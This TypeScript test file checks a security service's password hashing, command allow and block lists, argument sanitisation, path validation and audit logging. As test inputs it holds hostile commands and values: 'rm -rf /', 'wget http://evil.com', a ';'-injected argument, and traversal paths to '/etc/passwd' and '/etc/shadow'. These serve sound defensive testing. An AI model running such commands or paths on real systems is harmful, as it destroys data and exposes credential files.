/**
 * V3 Claude-Flow Security Flow Integration Tests
 *
 * Integration tests for security module workflow
 * Tests end-to-end security operations across components
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { createMock, type MockedInterface } from '../helpers/create-mock';
import { securityConfigs } from '../fixtures/configurations';

/**
 * Security service integration interface
 */
interface ISecurityService {
  initialize(): Promise<void>;
  validateAndHash(password: string): Promise<{ valid: boolean; hash?: string; errors: string[] }>;
  validateAndExecute(command: string, args: string[]): Promise<ExecutionResult>;
  validatePath(path: string): ValidationResult;
  shutdown(): Promise<void>;
}

/**
 * Crypto provider interface
 */
interface ICryptoProvider {
  argon2Hash(password: string, options: HashOptions): Promise<string>;
  argon2Verify(hash: string, password: string): Promise<boolean>;
  generateSalt(length: number): Promise<string>;
}

/**
 * Command executor interface
 */
interface ICommandExecutor {
  spawn(command: string, args: string[], options: SpawnOptions): Promise<SpawnResult>;
}

/**
 * Audit logger interface
 */
interface IAuditLogger {
  log(event: AuditEvent): Promise<void>;
  getEvents(filter?: AuditFilter): Promise<AuditEvent[]>;
}

interface HashOptions {
  memoryCost: number;
  timeCost: number;
  parallelism: number;
  salt: string;
}

interface ExecutionResult {
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
  blocked: boolean;
  reason?: string;
}

interface ValidationResult {
  valid: boolean;
  sanitized?: string;
  errors: string[];
}

interface SpawnOptions {
  timeout: number;
  shell: boolean;
}

interface SpawnResult {
  stdout: string;
  stderr: string;
  exitCode: number;
}

interface AuditEvent {
  type: string;
  action: string;
  details: unknown;
  timestamp: Date;
  success: boolean;
}

interface AuditFilter {
  type?: string;
  startTime?: Date;
  endTime?: Date;
}

/**
 * Security service implementation for integration testing
 */
class SecurityService implements ISecurityService {
  private initialized = false;

  constructor(
    private readonly crypto: ICryptoProvider,
    private readonly executor: ICommandExecutor,
    private readonly auditLogger: IAuditLogger,
    private readonly config: typeof securityConfigs.strict
  ) {}

  async initialize(): Promise<void> {
    this.initialized = true;
    await this.auditLogger.log({
      type: 'security',
      action: 'initialize',
      details: { config: 'strict' },
      timestamp: new Date(),
      success: true,
    });
  }

  async validateAndHash(password: string): Promise<{ valid: boolean; hash?: string; errors: string[] }> {
    const errors: string[] = [];

    // Validate password length
    if (!password || password.length < 8) {
      errors.push('Password must be at least 8 characters');
    }

    // Validate password complexity
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain uppercase letter');
    }
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain lowercase letter');
    }
    if (!/[0-9]/.test(password)) {
      errors.push('Password must contain number');
    }

    if (errors.length > 0) {
      await this.auditLogger.log({
        type: 'security',
        action: 'password_validation_failed',
        details: { errors },
        timestamp: new Date(),
        success: false,
      });
      return { valid: false, errors };
    }

    const salt = await this.crypto.generateSalt(16);
    const hash = await this.crypto.argon2Hash(password, {
      memoryCost: this.config.hashing.memoryCost ?? 65536,
      timeCost: this.config.hashing.timeCost ?? 3,
      parallelism: this.config.hashing.parallelism ?? 4,
      salt,
    });

    await this.auditLogger.log({
      type: 'security',
      action: 'password_hashed',
      details: { algorithm: this.config.hashing.algorithm },
      timestamp: new Date(),
      success: true,
    });

    return { valid: true, hash, errors: [] };
  }

  async validateAndExecute(command: string, args: string[]): Promise<ExecutionResult> {
    const baseCommand = command.split(' ')[0];

    // Check blocked commands
    if (this.config.execution.blockedCommands.includes(baseCommand)) {
      await this.auditLogger.log({
        type: 'security',
        action: 'command_blocked',
        details: { command: baseCommand },
        timestamp: new Date(),
        success: false,
      });

      return {
        success: false,
        stdout: '',
        stderr: 'Command blocked by security policy',
        exitCode: -1,
        blocked: true,
        reason: `Command "${baseCommand}" is blocked`,
      };
    }

    // Check allowed commands
    if (!this.config.execution.allowedCommands.includes(baseCommand)) {
      await this.auditLogger.log({
        type: 'security',
        action: 'command_not_allowed',
        details: { command: baseCommand },
        timestamp: new Date(),
        success: false,
      });

      return {
        success: false,
        stdout: '',
        stderr: 'Command not in allowed list',
        exitCode: -1,
        blocked: true,
        reason: `Command "${baseCommand}" is not allowed`,
      };
    }

    // Sanitize arguments
    const sanitizedArgs = args.map((arg) =>
      arg.replace(/[;&|`$()]/g, '').replace(/\n/g, '')
    );

    // Execute command
    const result = await this.executor.spawn(baseCommand, sanitizedArgs, {
      timeout: this.config.execution.timeout,
      shell: this.config.execution.shell,
    });

    await this.auditLogger.log({
      type: 'security',
      action: 'command_executed',
      details: { command: baseCommand, exitCode: result.exitCode },
      timestamp: new Date(),
      success: result.exitCode === 0,
    });

    return {
      success: result.exitCode === 0,
      stdout: result.stdout,
      stderr: result.stderr,
      exitCode: result.exitCode,
      blocked: false,
    };
  }

  validatePath(path: string): ValidationResult {
    const errors: string[] = [];

    // Check for empty path
    if (!path || path.length === 0) {
      errors.push('Path cannot be empty');
      return { valid: false, errors };
    }

    // Check for blocked patterns
    for (const pattern of this.config.paths.blockedPatterns) {
      if (path.includes(pattern)) {
        errors.push(`Path contains blocked pattern: ${pattern}`);
      }
    }

    // Check length
    if (path.length > this.config.paths.maxPathLength) {
      errors.push(`Path exceeds maximum length of ${this.config.paths.maxPathLength}`);
    }

    // Check null bytes
    if (path.includes('\0')) {
      errors.push('Path contains null byte');
    }

    if (errors.length > 0) {
      return { valid: false, errors };
    }

    // Sanitize path
    let sanitized = path;
    for (const pattern of this.config.paths.blockedPatterns) {
      sanitized = sanitized.split(pattern).join('');
    }
    sanitized = sanitized.replace(/\0/g, '');

    return { valid: true, sanitized, errors: [] };
  }

  async shutdown(): Promise<void> {
    await this.auditLogger.log({
      type: 'security',
      action: 'shutdown',
      details: {},
      timestamp: new Date(),
      success: true,
    });
    this.initialized = false;
  }
}

describe('Security Flow Integration', () => {
  let mockCrypto: MockedInterface<ICryptoProvider>;
  let mockExecutor: MockedInterface<ICommandExecutor>;
  let mockAuditLogger: MockedInterface<IAuditLogger>;
  let securityService: SecurityService;

  beforeEach(() => {
    mockCrypto = createMock<ICryptoProvider>();
    mockExecutor = createMock<ICommandExecutor>();
    mockAuditLogger = createMock<IAuditLogger>();

    mockCrypto.generateSalt.mockResolvedValue('random-salt-16');
    mockCrypto.argon2Hash.mockResolvedValue('$argon2id$v=19$...');
    mockCrypto.argon2Verify.mockResolvedValue(true);

    mockExecutor.spawn.mockResolvedValue({
      stdout: 'success',
      stderr: '',
      exitCode: 0,
    });

    mockAuditLogger.log.mockResolvedValue(undefined);
    mockAuditLogger.getEvents.mockResolvedValue([]);

    securityService = new SecurityService(
      mockCrypto,
      mockExecutor,
      mockAuditLogger,
      securityConfigs.strict
    );
  });

  describe('Password Security Flow', () => {
    it('should validate and hash password end-to-end', async () => {
      // Given
      await securityService.initialize();
      const password = 'SecurePass123!';

      // When
      const result = await securityService.validateAndHash(password);

      // Then
      expect(result.valid).toBe(true);
      expect(result.hash).toBeDefined();
      expect(result.errors).toHaveLength(0);
    });

    it('should reject invalid password with multiple errors', async () => {
      // Given
      await securityService.initialize();
      const password = 'weak';

      // When
      const result = await securityService.validateAndHash(password);

      // Then
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Password must be at least 8 characters');
    });

    it('should audit password operations', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.validateAndHash('SecurePass123!');

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'password_hashed',
        })
      );
    });

    it('should audit failed validation', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.validateAndHash('weak');

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'password_validation_failed',
          success: false,
        })
      );
    });
  });

  describe('Command Execution Security Flow', () => {
    it('should execute allowed command successfully', async () => {
      // Given
      await securityService.initialize();

      // When
      const result = await securityService.validateAndExecute('npm', ['install']);

      // Then
      expect(result.success).toBe(true);
      expect(result.blocked).toBe(false);
    });

    it('should block dangerous commands', async () => {
      // Given
      await securityService.initialize();

      // When
      const result = await securityService.validateAndExecute('rm', ['-rf', '/']);

      // Then
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain('rm');
    });

    it('should reject commands not in allowed list', async () => {
      // Given
      await securityService.initialize();

      // When
      const result = await securityService.validateAndExecute('wget', ['http://evil.com']);

      // Then
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
    });

    it('should sanitize command arguments', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.validateAndExecute('npm', ['install;rm -rf /']);

      // Then
      expect(mockExecutor.spawn).toHaveBeenCalledWith(
        'npm',
        ['installrm -rf /'], // Semicolon removed
        expect.any(Object)
      );
    });

    it('should audit command execution', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.validateAndExecute('npm', ['install']);

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'command_executed',
        })
      );
    });

    it('should audit blocked commands', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.validateAndExecute('rm', ['-rf']);

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'command_blocked',
          success: false,
        })
      );
    });
  });

  describe('Path Validation Security Flow', () => {
    it('should validate safe paths', async () => {
      // Given
      const path = './v3/src/security/index.ts';

      // When
      const result = securityService.validatePath(path);

      // Then
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should block directory traversal', async () => {
      // Given
      const path = '../../../etc/passwd';

      // When
      const result = securityService.validatePath(path);

      // Then
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('../'))).toBe(true);
    });

    it('should block absolute system paths', async () => {
      // Given
      const path = '/etc/shadow';

      // When
      const result = securityService.validatePath(path);

      // Then
      expect(result.valid).toBe(false);
    });

    it('should block null byte injection', async () => {
      // Given
      const path = 'file.txt\0.exe';

      // When
      const result = securityService.validatePath(path);

      // Then
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('null byte'))).toBe(true);
    });

    it('should sanitize and return safe path', async () => {
      // Given
      const path = './safe/path/file.ts';

      // When
      const result = securityService.validatePath(path);

      // Then
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('./safe/path/file.ts');
    });
  });

  describe('Security Service Lifecycle', () => {
    it('should initialize and audit', async () => {
      // When
      await securityService.initialize();

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'initialize',
        })
      );
    });

    it('should shutdown and audit', async () => {
      // Given
      await securityService.initialize();

      // When
      await securityService.shutdown();

      // Then
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'security',
          action: 'shutdown',
        })
      );
    });
  });

  describe('CVE Prevention Integration', () => {
    it('should prevent CVE-1 (directory traversal) end-to-end', async () => {
      // Given
      const attacks = [
        '../../../etc/passwd',
        '..\\..\\..\\Windows\\System32',
        '....//....//etc/passwd',
      ];

      // When/Then
      for (const attack of attacks) {
        const result = securityService.validatePath(attack);
        expect(result.valid).toBe(false);
      }
    });

    it('should prevent CVE-2 (absolute path injection) end-to-end', async () => {
      // Given
      const attacks = ['/etc/passwd', '/var/log/auth.log', '/tmp/malicious'];

      // When/Then
      for (const attack of attacks) {
        const result = securityService.validatePath(attack);
        expect(result.valid).toBe(false);
      }
    });

    it('should prevent CVE-3 (command injection) end-to-end', async () => {
      // Given
      await securityService.initialize();

      // When
      const result = await securityService.validateAndExecute('npm', [
        'install; rm -rf /',
      ]);

      // Then - command should execute but with sanitized args
      expect(mockExecutor.spawn).toHaveBeenCalledWith(
        'npm',
        ['install rm -rf /'], // Semicolon removed
        expect.any(Object)
      );
    });
  });
});
